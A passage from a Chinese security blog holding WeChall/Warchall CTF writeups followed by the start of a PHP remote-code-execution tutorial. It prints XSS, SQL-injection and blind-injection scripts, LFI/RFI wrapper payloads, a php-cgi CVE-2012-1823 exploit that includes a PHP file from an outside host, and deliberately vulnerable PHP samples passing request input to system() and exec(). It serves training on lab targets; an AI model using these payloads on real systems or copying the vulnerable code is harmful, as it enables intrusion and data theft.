<p>在 php 的正则里面，<code>^$</code>的意思是匹配前一个换行符之后，下一个换行符之前，这中间一段的字符。所以，我们只需要输入16个任意大小写字母，再加上一个换行符（%0A) 就可以了。</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_regexmini.png" alt=""></p>
<h2 id="Are-you-serial"><a href="#Are-you-serial" class="headerlink" title="Are you serial"></a>Are you serial</h2><p><a href="http://byd.dropsec.xyz/2016/07/24/PHP-Object-Injection/">PHP对象注入</a></p>
<h2 id="Yourself-PHP"><a href="#Yourself-PHP" class="headerlink" title="Yourself PHP"></a>Yourself PHP</h2><p>PHP的$_SERVER[‘PHP_SELF’]造成的XSS漏洞.</p>
<p>测试代码如下：</p>
<pre><code>&lt;?php
//require &apos;check.php&apos;;
if (isset($_POST[&apos;username&apos;])){
        echo sprintf(&quot;Well done %s, you entered your username. But this is not what you need to do.&quot;, htmlspecialchars($_POST[&apos;username&apos;]));
}
echo &apos;&lt;div class=&quot;box box_c&quot;&gt;&apos;.PHP_EOL;
echo sprintf(&apos;&lt;form action=&quot;%s&quot; method=&quot;post&quot;&gt;&apos;, $_SERVER[&apos;PHP_SELF&apos;]).PHP_EOL;
    echo sprintf(&apos;&lt;div&gt;Username:&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot; /&gt;&lt;/div&gt;&apos;).PHP_EOL;
echo sprintf(&apos;&lt;div&gt;&lt;input type=&quot;submit&quot; name=&quot;deadcode&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;&apos;).PHP_EOL;
echo sprintf(&apos;&lt;/form&gt;&apos;).PHP_EOL;
echo &apos;&lt;/div&gt;&apos;.PHP_EOL;
?&gt;
</code></pre><p>构造POC：</p>
<blockquote>
<p><code>http://127.0.0.1:8080/xss/test1.php/&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;</code></p>
</blockquote>
<p>效果如下：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_YourselfPHP.png" alt=""></p>
<h2 id="PHP-0819"><a href="#PHP-0819" class="headerlink" title="PHP 0819"></a>PHP 0819</h2><p><strong>PHP heredoc</strong></p>
<p>题的意思就是让eval=’1337’,但是过滤了单引号，使用heredoc便能绕过对于引号的过滤，注入想要的字符串。</p>
<p>php 中的 heredoc技术是php用来引用字符串的一种方式。在phpwind中巧妙的运用了这个技术，实现了逻辑代码和界面设计的分离。</p>
<pre><code>语法：  

1. 使用操作符  “&lt;&lt;&lt;”

2. 操作符后紧跟标识符（开始标识符），之后重起新的一行 输入要引用的字符串，可以包含变量。

3. 新的一行，顶格写结束表示符，以分号结束。

要注意到几点：

1. 标识符可以自定义 一般的 有EOT ，EOD  EOF 等， 只要保持开始表示符和结束表示符一样即可。

2. 结束表示符必须独占一行，且必须顶格写，最后以 ‘;’ 分号结尾。

3. 所有引用的字符串中可以包含变量，无需字符串连接符。

例如：
echo &lt;&lt;&lt;suibian
正文
正文
suibian;
// 格式应该是 &lt;&lt;&lt;+任意字符x+换行+字符串+换行+任意字符x+;换行
</code></pre><p>构造POC：</p>
<blockquote>
<p><a href="http://www.wechall.net/challenge/space/php0819/index.php?eval=" target="_blank" rel="external">http://www.wechall.net/challenge/space/php0819/index.php?eval=</a>&lt;&lt;&lt;s%0a1337%0as;%0a</p>
</blockquote>
<h2 id="MD5-SALT"><a href="#MD5-SALT" class="headerlink" title="MD5.SALT"></a>MD5.SALT</h2><p>简单的sql注入</p>
<p>最后构造语句：</p>
<blockquote>
<p>‘ and 1=2 union select password,2 from users where username=”Admin”#</p>
</blockquote>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_MD5_salt.png" alt=""></p>
<h2 id="Order-By-Query"><a href="#Order-By-Query" class="headerlink" title="Order By Query"></a>Order By Query</h2><p>order by 注入。</p>
<p>1.可以使用and进行双重查询</p>
<p><code>1 and (select count(*) from products group by concat(version(),0×27202020,floor(rand(0)*2-1)))–</code></p>
<p>2.在desc/asc [参数] 之后使用双重查询</p>
<p><code>1 desc,(select count(*) from users group by concat(version(),0x27202020,floor(rand(0)*2-1)))&#39;5.0.95-community&#39;</code></p>
<p>具体的请参照：<a href="http://www.2cto.com/Article/201211/170433.html" target="_blank" rel="external">order by/limit之后注入</a></p>
<p>关于报错注入的一些语法请参照：<a href="http://www.waitalone.cn/mysql-error-based-injection.html" target="_blank" rel="external">报错注入方法整理</a></p>
<p>构造POC：</p>
<blockquote>
<p><code>http://www.wechall.net/challenge/order_by_query/index.php?by=1 and ExtractValue(1,(select password from users where username=CHAR(65, 100, 109, 105, 110)))#</code></p>
</blockquote>
<p>得到MD5：</p>
<blockquote>
<p>C3CBEB0C8ADC66F2922C65E7784BE14</p>
</blockquote>
<h2 id="Can-you-read-me"><a href="#Can-you-read-me" class="headerlink" title="Can you read me"></a>Can you read me</h2><p>tesseract这个软件可以做ocr</p>
<h2 id="Crappyshare"><a href="#Crappyshare" class="headerlink" title="Crappyshare"></a>Crappyshare</h2><p>构造POC:</p>
<blockquote>
<p><a href="http://www.wechall.net/challenge/crappyshare/crappyshare.php?file://solution.php" target="_blank" rel="external">http://www.wechall.net/challenge/crappyshare/crappyshare.php?file://solution.php</a></p>
</blockquote>
<p>当我们输入的file://参数被带入curl中执行时，原本的远程URL访问会被重定向到本地磁盘上，从而达到越权访问文件的目的</p>
<p>推荐一篇文章：<a href="http://www.cnblogs.com/littlehann/p/3665062.html" target="_blank" rel="external">LFI、RFI、PHP封装协议安全问题学习</a></p>
<h2 id="Warchall-Live-LFI"><a href="#Warchall-Live-LFI" class="headerlink" title="Warchall: Live LFI"></a>Warchall: Live LFI</h2><p>进去之后发现左上角，有个按钮，直改后面的参数为<code>solution.php</code>,</p>
<p>POC1:<code>http://lfi.warchall.net/index.php?lang=solution.php</code></p>
<p>回应如下：</p>
<pre><code>teh falg si naer!

the flag is near!

PHP Warning(2): Illegal string offset &apos;welcome&apos; in index.php line 12

Backtrace starts in index.php line 12.
GWF_Debug::error_handler() core/inc/util/GWF_Debug.php line 183.
</code></pre><p>本地文件包含，使用<code>php://filter/read</code>读一下solution.php的源码</p>
<p>POC2:</p>
<blockquote>
<p><a href="http://lfi.warchall.net/?lang=php://filter/read=convert.base64-encode/resource=solution.php" target="_blank" rel="external">http://lfi.warchall.net/?lang=php://filter/read=convert.base64-encode/resource=solution.php</a></p>
</blockquote>
<p>base64解密：</p>
<pre><code>&lt;html&gt;
&lt;body&gt;
&lt;pre style=&quot;color:#000;&quot;&gt;teh falg si naer!&lt;/pre&gt;
&lt;pre style=&quot;color:#fff;&quot;&gt;the flag is near!&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;?php                  #   YOUR_TROPHY 
return &apos;SteppinStones42Pie&apos;; # &lt;-´ ?&gt;
</code></pre><h2 id="Warchall-Live-RFI"><a href="#Warchall-Live-RFI" class="headerlink" title="Warchall: Live RFI"></a>Warchall: Live RFI</h2><p>能查看页面能容的PHP伪协议，我知道的只有两种：</p>
<pre><code>?file=data:text/plain,&lt;?php system(&quot;net user&quot;)?&gt;

?file=php://filter/read=convert.base64-encode/resource=index.php
</code></pre><p>我使用filter读协议出来了竟然：</p>
<pre><code>PGh0bWw+Cjxib2R5Pgo8cHJlPk5PVEhJTkcgSEVSRT8/Pz88L3ByZT4KPC9ib2R5Pgo8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCByZXR1cm4gJ0xvd19INE5HSU5HX0ZydWl0JzsgPz4K 
</code></pre><p>但是解密发现不对有？？？，然后我发现base64里面有好多重复的，然后我删除点</p>
<pre><code>&lt;html&gt;
&lt;body&gt;
&lt;pre&gt;NOTHING HERE????&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;              &lt;?php return &apos;Low_H4NGING_Fruit&apos;; ?&gt;
</code></pre><p>好吧，，，</p>
<p>试了试data协议,也可以。</p>
<blockquote>
<p><a href="http://rfi.warchall.net/index.php?lang=data:text/plain" target="_blank" rel="external">http://rfi.warchall.net/index.php?lang=data:text/plain</a>,&lt;?php system(“cat solution.php”)?&gt;</p>
</blockquote>
<h2 id="Impossible-n’est-pas-francais"><a href="#Impossible-n’est-pas-francais" class="headerlink" title="Impossible n’est pas français"></a>Impossible n’est pas français</h2><p>分解一个很大的数的质因数。需要6s 内提交 </p>
<p>但是，只要我们尝试提交一次之后，就可以发现它会返回一个正确的解。</p>
<p>既然如此，我们只要先提交一次，然后程序读取它返回的正确数字串，再提交就可以了。</p>
<p>python脚本如下：</p>
<pre><code>#!/usr/bin/env python
# coding=utf-8
import requests
import urllib2
import lxml
import lxml.html as H
from bs4 import BeautifulSoup

cookie = {
    &apos;WC&apos;: &apos;9038838-0-DGwGp7VNYefa6o7o&apos;
}
def get_number():
    number_url = &apos;http://www.wechall.net/challenge/impossible/index.php?request=new_number&apos;
    #opener = urllib2.build_opener()
    #opener.addheaders.append((&apos;Cookie&apos;,&apos;WC=9038838-0-DGwGp7VNYefa6o7o&apos;))
    #f = opener.open(number_url)
    #html = f.read()
    #html = urllib2.urlopen(number_url).read()
    #soup = BeautifulSoup(html)
    resp = requests.get(number_url, cookies=cookie)
    res =resp.content
    soup = BeautifulSoup(res)
    div_new = soup.find(&apos;div&apos;,{&quot;id&quot;:&quot;page&quot;})
    movie_new = div_new.get_text()
    print movie_new
get_number()

def get_answer():
    post_data = {
        &apos;solution&apos;: &apos;&apos;,
        &apos;cmd&apos;: &apos;Send&apos;,
        &apos;gwf3_csrf&apos;: &apos;bNZbC2XL&apos;
    }
    url = &apos;http://www.wechall.net/challenge/impossible/index.php&apos; 
    resp = requests.post(url, cookies=cookie, data=post_data)
    # print resp.text
    d = H.document_fromstring(resp.text)
    import re
    ar = re.compile(r&apos;&quot;(\d+)&quot;&apos;)
    text = d.xpath(&apos;//div[@class=\&apos;gwf_errors\&apos;]/ul/li&apos;)[0].text_content()
    ans = ar.findall(text)[0]

    print ans 

    post_data = {
        &apos;solution&apos;: ans,
        &apos;cmd&apos;: &apos;Send&apos;,
        &apos;gwf3_csrf&apos;: &apos;bNZbC2XL&apos;
    }
    resp = requests.post(url, cookies=cookie, data=post_data)
    print resp.text
get_answer()
</code></pre><p>运行结果为：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_yinshifenjie.png" alt=""></p>
<h2 id="Py-Tong"><a href="#Py-Tong" class="headerlink" title="Py-Tong"></a>Py-Tong</h2><p>查看 Python 源代码，可以发现，该程序会读取一个你指定的文件两次。</p>
<pre><code>如果第一次读取成功之后，第二次尝试读取失败，返回true。
如果第一次和第二次读取得到的内容不一样，返回true。
</code></pre><p>这样，知道了这些之后，我们就可以写一个文件，去和这个程序进行竞争。</p>
<h2 id="Blinded-by-the-light"><a href="#Blinded-by-the-light" class="headerlink" title="Blinded by the light"></a>Blinded by the light</h2><p>盲注</p>
<p>主要的代码为：</p>
<blockquote>
<p>$query = “SELECT 1 FROM (SELECT password FROM blight WHERE sessid=$sessid) b WHERE password=’$password’”;</p>
</blockquote>
<p>这里的 password 明显没有经过过滤就带入查询。<br>那么，我们可以通过 OR 盲注来让它返回不同的页面，借此来判断语句的正确性。</p>
<p>脚本如下：</p>
<pre><code>#!/usr/bin/env python2
import urllib
import urllib2
def makePayload(statement):
    return &quot;&apos; or substring(password, %d, 1)%s&apos;%s&quot; % (statement[0], statement[1], statement[2])
def checkResponse(response):
    return response.find(&quot;Welcome back&quot;) &gt; 0
def doAssert(statement):
    url = &apos;http://www.wechall.net/challenge/blind_light/index.php&apos;
    values = {&apos;injection&apos;:makePayload(statement),&apos;inject&apos;:&apos;Inject&apos;}
    data = urllib.urlencode(values)
    req = urllib2.Request(url, data)
    req.add_header(&apos;cookie&apos;,&apos;WC=8448003-14306-bFzUNqXxpwMud1xu&apos;)
    response = urllib2.urlopen(req)
    content = response.read()
    return checkResponse(content)
if __name__ == &quot;__main__&quot;:
    alphalist = &quot;0123456789ABCDEF&quot;
    result = []
    for idx in range(1,33):
        start = 0
        end = 16 #[start, end)
        while (start &lt; end):
            print(&quot;[%d, %d)&quot; % (start, end))
            if (end - start == 1):
                result.append(alphalist[start])
                break
            else:
                middle = (start + end)/2
                if(doAssert([idx, &apos;&lt;&apos;, alphalist[middle]])):
                    end = middle
                else:
                    start = middle
        print &apos;&apos;.join(result)
</code></pre><h2 id="Training-Net-Ports"><a href="#Training-Net-Ports" class="headerlink" title="Training: Net Ports"></a>Training: Net Ports</h2><p>让我们链接这个主机的42端口。</p>
<p>curl使用 –local-port 参数,带上自己的cookies</p>
<blockquote>
<p>sudo curl –local-port 42 -c ‘WC=YOUR_COOKIES’ <a href="http://www.wechall.net/challenge/training/net/ports/index.php" target="_blank" rel="external">http://www.wechall.net/challenge/training/net/ports/index.php</a></p>
</blockquote>
<h2 id="Pimitive-Encryption"><a href="#Pimitive-Encryption" class="headerlink" title="Pimitive Encryption"></a>Pimitive Encryption</h2><p>用onetime-pad xor加密的zip文件,通过zip的magic number可以确定onetime-pad的前四位,转换成char输出后发现是3.14</p>
<p>于是该用什么解密就很明显了,下载一个pi之后xor一下,就能还原了</p>
<h2 id="Repeating-History"><a href="#Repeating-History" class="headerlink" title="Repeating History"></a>Repeating History</h2><p>网页和github是对应的。。</p>
<p>先翻到第一个 </p>
<pre><code>https://github.com/gizmore/gwf3/blob/565015f6561776c90f77e5623d978d70ca7bf2d3/www/challenge/subversive/repeating/what_do_you_want_here.php
</code></pre><p>然后repo内搜索solution发现了一个 </p>
<pre><code>https://github.com/gizmore/gwf3/blob/a98616544df4997a1bef7dfc109d35b3c6e0aab9/www/challenge/subversive/history/install.php
</code></pre><p>md5解出来是wrong，翻一下这个文件的commit记录</p>
<pre><code>https://github.com/gizmore/gwf3/commit/a98616544df4997a1bef7dfc109d35b3c6e0aab9
-$solution = ‘NothingHereMoveAlong’;
+$solution = ‘2bda2998d9b0ee197da142a0447f6725’;
</code></pre><p>拼接一下：InDaxInNothingHereMoveAlong</p>
<h2 id="Host-Me"><a href="#Host-Me" class="headerlink" title="Host Me"></a>Host Me</h2><p>改http头的Host。这点很简单，但是有个问题就是，它内网有一台机器也叫做localhost。这就导致了如果是简简单单地访问localhost的话，其实访问的是那台机器而非我们做题的机器。<br>为了避免这个问题，我们就要使用绝对路径的 URL，就是 GET 后面的网址补全，然后 Host 再写成localhost就可以了</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_hostme.png" alt=""></p>
<h2 id="Stegano-Woman"><a href="#Stegano-Woman" class="headerlink" title="Stegano Woman"></a>Stegano Woman</h2><p>打开之后注释部分使用16进制编辑器打开</p>
<p>发现是09(tab)和20(space),把其中的一个当作1另一个当作0,换成二进制再转换成字符串之后输出即可</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_stegano_woman.png" alt=""></p>
<h2 id="Quangcurrency"><a href="#Quangcurrency" class="headerlink" title="Quangcurrency"></a>Quangcurrency</h2><p>这题不会，没看懂，附一个别人的writeup</p>
<pre><code>读题是很重要的…来把这个题目大概念出来,它是什么?concurrency对不对?又是一道竞态的题目.

只要卡着buy和click,想方设法跑到10个item就可以

cookie = {
    &apos;WC&apos;: &apos;8429765-12152-0vjRl2XoKWFYAmvh&apos;
}

def f1():
    requests.get(&apos;http://www.wechall.net/challenge/quangcurrency/click.php&apos;, cookies=cookie)

def f2():
    requests.get(&apos;http://www.wechall.net/challenge/quangcurrency/buy.php&apos;, cookies=cookie)
import requests
import threading
import time

import lxml
import lxml.html as H
import re

r = re.compile(r&apos;\w+: (\d+)&apos;)

i = 0 
while True:
    i += 1
    print &quot;turn %d&quot; % i
    print &apos;start click&apos;
    t1 = threading.Thread(target = f1)
    print &apos;start buy&apos;
    t2 = threading.Thread(target = f2)

    t1.start()
    t2.start()
    t1.join()
    t2.join()

    text = requests.get(&apos;http://www.wechall.net/challenge/quangcurrency/stats.php&apos;, cookies=cookie).text
    d = H.document_fromstring(text)
    msg = d.xpath(&apos;//div[@class=\&apos;box_c\&apos;]&apos;)[0]
    # import pdb;pdb.set_trace()
    a,b,c  = r.findall(msg.text_content())
    print &apos;get %s item &apos; % c

    if int(c)&gt;=10:
        break

    if int(a) &lt; 1000:
        print &apos;reset&apos;
        requests.get(&apos;http://www.wechall.net/challenge/quangcurrency/reset.php&apos;, cookies=cookie)
友情提示,它肯定可以跑出来,但它永远不会停下,最好自己确认这个challenge是不是已经完成了.
</code></pre><h2 id="Stop-us"><a href="#Stop-us" class="headerlink" title="Stop us"></a>Stop us</h2><p>关键在于这句话</p>
<blockquote>
<p>‘ignore_user_abort’ =&gt; false</p>
</blockquote>
<p>这句话所造成的后果就是，一个脚本当用户断开连接（关闭窗口之类的），这个脚本就会被强行终止。<br>再看看 php 脚本，可以发现它是先给我们添加了一个域名，之后才扣费的。<br>所以我们只要在扣费前关掉页面即可。</p>
<h2 id="Screwed-Signup"><a href="#Screwed-Signup" class="headerlink" title="Screwed Signup"></a>Screwed Signup</h2><p>ISCC2016的一道题</p>
<p>SQL table里username最多24个字符，但是preg_match检查时可以最多到64个。于是这里可能造成截断.</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_screwed_signup.png" alt=""></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_screwed_signup2.png" alt=""></p>
<h2 id="Table-Names-II"><a href="#Table-Names-II" class="headerlink" title="Table Names II"></a>Table Names II</h2><pre><code>http://www.wechall.net/challenge/table_names/challenge.php
?username=&apos; union select database(),2,group_concat(0x3f,table_name) from information_schema.tables where table_schema=database() -- 
&amp;password=test
&amp;login=login
</code></pre><p>也可以这样：</p>
<pre><code>http://www.wechall.net/challenge/table_names/challenge.php
?username=&apos; union select 1,2,info from information_schema.processlist-- 
&amp;password=test
&amp;login=login
</code></pre><p>运行结果为：</p>
<pre><code>Welcome back gizmore_tableu61

Your personal welcome message is: ?aaawrong,?usertableus4

This ensures you are not on a fake evil phising site.
</code></pre><p>提交：gizmore_tableu61_usertableus4</p>
<h2 id="AUTH-me"><a href="#AUTH-me" class="headerlink" title="AUTH me"></a>AUTH me</h2><p>SSL 加密传输的问题。</p>
<p>访问<code>https://authme.wechall.net/challenge/space/auth_me/www/index.php</code></p>
<p>提示说：</p>
<pre><code>Error

Renegotiation is not allowed
</code></pre><p>所以我们需要去找这个证书，然后导入。</p>
<p>其实，你观察下它 apache.conf 的网址，</p>
<blockquote>
<p><a href="http://www.wechall.net/challenge/space/auth\_me/**find_me/apache.conf**" target="_blank" rel="external">http://www.wechall.net/challenge/space/auth\_me/**find_me/apache.conf**</a></p>
</blockquote>
<p>会发现叫做 find_me 的文件夹。直接访问</p>
<pre><code>apache.conf               05-May-2015 21:18  1.0K  
client.crt                05-May-2015 21:18  1.5K  
client.key                05-May-2015 21:18  3.2K  
client.p12                05-May-2015 21:18  4.7K  
server.crt                05-May-2015 21:18  1.5K  
</code></pre><p>导入client.p12 即可</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_auth_me.png" alt=""></p>
<h2 id="Warchall-Live-RCE"><a href="#Warchall-Live-RCE" class="headerlink" title="Warchall: Live RCE"></a>Warchall: Live RCE</h2><p>具体漏洞是：CVE-2012-1823（PHP-CGI RCE）</p>
<p>在地址后面加进参数运行对应的php-cgi 参数的行为,根据解释，如果query string中不包含未urlencoded的等号，那么整个query会以空格分词，传给php-cgi。于是我们传-s，就会把php文件源码回显。</p>
<p>例如 index.php?-s</p>
<p>相参于/usr/bin/php53-cgi/php-cgi -f index.php -s</p>
<p>php-cgi –help如下</p>
<pre><code>Usage: php-cgi [-q] [-h] [-s] [-v] [-i] [-f &lt;file&gt;]
    php-cgi &lt;file&gt; [args...]
    -a               Run interactively
    -b &lt;address:port&gt;|&lt;port&gt; Bind Path for external FASTCGI Server mode
    -C               Do not chdir to the script&apos;s directory
    -c &lt;path&gt;|&lt;file&gt; Look for php.ini file in this directory
    -n               No php.ini file will be used
    -d foo[=bar]     Define INI entry foo with value &apos;bar&apos;
    -e               Generate extended information for debugger/profiler
    -f &lt;file&gt;        Parse &lt;file&gt;.  Implies `-q&apos;
    -h               This help
    -i               PHP information
    -l               Syntax check only (lint)
    -m               Show compiled in modules
    -q               Quiet-mode.  Suppress HTTP Header output.
    -s               Display colour syntax highlighted source.
    -v               Version number
    -w               Display source with stripped comments and whitespace.
    -z &lt;file&gt;        Load Zend extension &lt;file&gt;.
    -T &lt;count&gt;       Measure execution time of script repeated &lt;count&gt; times.
</code></pre><p>查看源码：</p>
<blockquote>
<p><a href="http://rce.warchall.net/?-s" target="_blank" rel="external">http://rce.warchall.net/?-s</a></p>
</blockquote>
<p>里面包含了一个<code>../config.php</code>,所以我要去读它。</p>
<pre><code>在刚开始进的页面里发现index.php的目录为：

[SCRIPT\_FILENAME] =&gt; /home/level/20_live_rce/www/index.php

所以../config.php 的绝对路径是：

/home/level/20_live_rce/config.php
</code></pre><p>php-cgi参数中：</p>
<p>d foo[=bar]     Define INI entry foo with value ‘bar’</p>
<pre><code>-dallow_url_include=On

-dauto_prepend_file=/tmp/2.php
</code></pre><p>在/tmp里建立一个2.php内容是</p>
<pre><code>&lt;?php
exec(&quot;cat /home/level/20_live_rce/config.php&quot;,$out);
print_r($out);
?&gt;
</code></pre><p>构造地址：</p>
<blockquote>
<p><a href="http://rce.warchall.net/?-d" target="_blank" rel="external">http://rce.warchall.net/?-d</a> allow_url_include=On -d auto_prepend_file=<a href="http://oacotcyq8.bkt.clouddn.com/2.php" target="_blank" rel="external">http://oacotcyq8.bkt.clouddn.com/2.php</a> -n</p>
</blockquote>
<p>urlencode:</p>
<blockquote>
<p><a href="http://rce.warchall.net/?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3Dhttp%3%2f%2foacotcyq8.bkt.clouddn.com%2f2.php+-n" target="_blank" rel="external">http://rce.warchall.net/?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3Dhttp%3%2f%2foacotcyq8.bkt.clouddn.com%2f2.php+-n</a></p>
</blockquote>
<h2 id="Blinded-by-the-lighter"><a href="#Blinded-by-the-lighter" class="headerlink" title="Blinded by the lighter"></a>Blinded by the lighter</h2><p>还是盲注，加时间延迟注入。</p>
<h2 id="Light-in-the-Darkness"><a href="#Light-in-the-Darkness" class="headerlink" title="Light in the Darkness"></a>Light in the Darkness</h2><p>这道题的错误会回显，而且限制要在2次query内得到答案，所以用error based：</p>
<p>POC1:</p>
<p><code>&#39; or row(1,1) &gt; (select count(*),concat(password,&#39;$&#39;,floor(rand(0)*2))x from (select 1 union select 2 union select 3)a group by x limit 1) #</code></p>
<p>POC2:</p>
<p><code>&#39; or (select count(*) from information_schema.tables group by concat(password,floor(rand(0)*2)))--</code></p>
<p>原理：</p>
<blockquote>
<p><a href="http://stackoverflow.com/questions/11787558/sql-injection-attack-what-does-this-do" target="_blank" rel="external">http://stackoverflow.com/questions/11787558/sql-injection-attack-what-does-this-do</a></p>
</blockquote>
<p>简单地说，floor(rand(0)*2)会得到0,1,1,0……第2个和第3个重复的1会造成重复的group_key。而且我们需要一个行数大于3的表，所以选择information_schema</p>
<h2 id="Brainfucked"><a href="#Brainfucked" class="headerlink" title="Brainfucked"></a>Brainfucked</h2><p>alert(XXX)xxx为 文件内容。</p>
<pre><code>function anonymous() {
var s = &apos;UnfudgedDebugStuff&apos;; s = s.length; alert(s); document.location.href=&apos;https://www.google.co.uk&apos;;
}
</code></pre><h2 id="eXtract-Me"><a href="#eXtract-Me" class="headerlink" title="eXtract Me"></a>eXtract Me</h2><p>一个压缩包，解压发现里面一直有个压缩包，应该不是这么多</p>
<p>解压一次之后使用16进制打开</p>
<p>可以发现是两个压缩包拼接在一起的。所以我们只要把后面的压缩包扣出来即可。</p>
<p>还是解压，出来一个xar文件，通过 7zip 解压，出来一个又一个奇葩文件。。</p>
<p>但是，在解压途中会发现有一个rar 的注释是有东西的。拷贝出来，用这数据新建一个rar文件，发现需要密码。</p>
<p>密码为：L0LYouThInkiTSh0uldB3SoEasY? </p>
<h2 id="Are-you-blind"><a href="#Are-you-blind" class="headerlink" title="Are you blind?"></a>Are you blind?</h2><p>还是盲注，报错来判断。</p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> writeup </tag>
            
            <tag> WeChall </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[远程代码执行漏洞总结]]></title>
      <url>/2016/07/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>远程代码执行是指程序代码在处理输入输出的时候没有严格控制。导致用户可以构造参数包含执行远程代码在服务器上执行，进而获取到服务器权限，是发生在应用程序的逻辑层上的漏洞</p>
<a id="more"></a>
<h1 id="0x01-OS命令执行"><a href="#0x01-OS命令执行" class="headerlink" title="0x01 OS命令执行"></a>0x01 OS命令执行</h1><p>系统命令执行是指应用程序对传入命令行的参数过滤不严格导致恶意用户能控制最终执行的命令，进而入侵系统，导致严重破坏的高危漏洞。(bash,shell)</p>
<p>shell是系统的用户界面，提供用户与内核交互操作的接口，它接收用户输入的命令并把它送入到内核去执行。实际上shell是一个命令解释器，它的一个重要特性就是它自身就是一个解释型的程序语言。</p>
<p>分类：</p>
<pre><code>1.1 OS本身命令执行
1.2 Web命令执行
1.3 数据库命令执行
1.4 第三方软件命令执行
</code></pre><h1 id="0x02-命令执行模型"><a href="#0x02-命令执行模型" class="headerlink" title="0x02 命令执行模型"></a>0x02 命令执行模型</h1><h2 id="0x02-1-PHP命令执行函数利用"><a href="#0x02-1-PHP命令执行函数利用" class="headerlink" title="0x02.1 PHP命令执行函数利用"></a>0x02.1 PHP命令执行函数利用</h2><p><strong>1、system：</strong>system函数可以用来执行一个外部的应用程序并将相应的执行结果输出，函数原型为：</p>
<blockquote>
<p>string system(string command,int &amp;return_var)</p>
</blockquote>
<p>其中，command是要执行的命令，return_var存放执行命令的执行后的状态</p>
<p>示例代码如下：</p>
<pre><code>&lt;?php
$dir = $_GET[&quot;dir&quot;];
if(isset($dir))
{
    echo &quot;&lt;pre&gt;&quot;;
    system(&quot;net user&quot;.$dir);
    echo &quot;&lt;/pre&gt;&quot;;
}
?&gt;
</code></pre><p>执行结果为：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/command_1.png" alt=""><br>上述代码就是把dir这个命令写死了，把net user执行的结果给$dir变量。但是注意一些连接符，管道符如：<code>&amp;,&amp;&amp;,|,||,:</code>等，如果我们输入<code>?dir=| netstat -an</code></p>
<p><strong>注：<code>|</code>只执行后面的命令，<code>||</code>前后命令都执行。</strong></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/command_2.png" alt=""></p>
<p><strong>2、exec：</strong>exec函数可以用来执行一个外部的应用程序，函数原型为：</p>
<blockquote>
<p>string exec(string command,array &amp;output,int &amp;return_var)</p>
</blockquote>
<p>其中，command是要执行的命令，output是获得执行命令输出的每一行字符串，return_var是存放执行命令后的状态值。</p>
<p>示例代码：</p>
<pre><code>&lt;?php
$cmd = $_GET[&quot;cmd&quot;];
$output = array();
echo &quot;&lt;pre&gt;&quot;;
exec($cmd,$output);
echo &quot;&lt;/pre&gt;&quot;;
while(list($key,$value)=each($output))
{
    echo $value.&quot;&lt;br&gt;&quot;;
}
?&gt;
</code></pre><p>执行结果为：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/command_3.png" alt=""></p>
<p><strong>3、passthru：</strong>passthru函数可以用来执行一个unix系统命令并显示原始的输出，当unix系统令的输出是二进制的数据，并且需要直接返回值给浏览器时，需要使用passthru函数来替代system和exec函数。原型为：</p>
<blockquote>
<p>void passthru(string command,int &amp;teturn_var)</p>
</blockquote>
<p>其中command是要执行的命令，return_var存放执行命令后的状态值。</p>
<p>示例代码如下：</p>
<pre><code>&lt;?php
$cmd = $_GET[&quot;cmd&quot;];
echo &quot;&lt;pre&gt;&quot;;
passthru($cmd);
echo &quot;&lt;/pre&gt;&quot;;
?&gt;
</code></pre><p><strong>4、shell_exec：</strong>执行shell命令并返回输出的字符串，函数原型为u：</p>
<blockquote>
<p>string shell_exec(string command)</p>
</blockquote>
<p>其中command是要执行的命令。</p>
<pre><code>&lt;?php
$cmd = $_GET[&quot;cmd&quot;];
echo &quot;&lt;pre&gt;&quot;;
shell_exec($cmd);
echo &quot;&lt;/pre&gt;&quot;;
?&gt;
</code></pre><p><strong>5、`运算符：</strong>与shell_exec功能相同，通常用于绕过黑名单</p>
<p>示例代码如下：</p>
<pre><code>&lt;?php
$cmd = $_GET[&quot;cmd&quot;];
$output = `$cmd`;
echo &quot;&lt;pre&gt;&quot;;
echo $output;
echo &quot;&lt;/pre&gt;&quot;;
?&gt;
</code></pre><p>执行结果为：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/command_4.png" alt=""></p>
<h2 id="0x02-2-eval注入攻击利用"><a href="#0x02-2-eval注入攻击利用" class="headerlink" title="0x02.2 eval注入攻击利用"></a>0x02.2 eval注入攻击利用</h2><p>出来可以利用函数命令注入攻击方式外还可以使用eval注入攻击方式，eval函数会将参数字符串作为<strong>php程序代码</strong>来执行，用户可以将php代码保存成字符串的形式，然后传递给eval函数执行。原型为：</p>
<blockquote>
<p>mixed eval(string code_str)</p>
</blockquote>
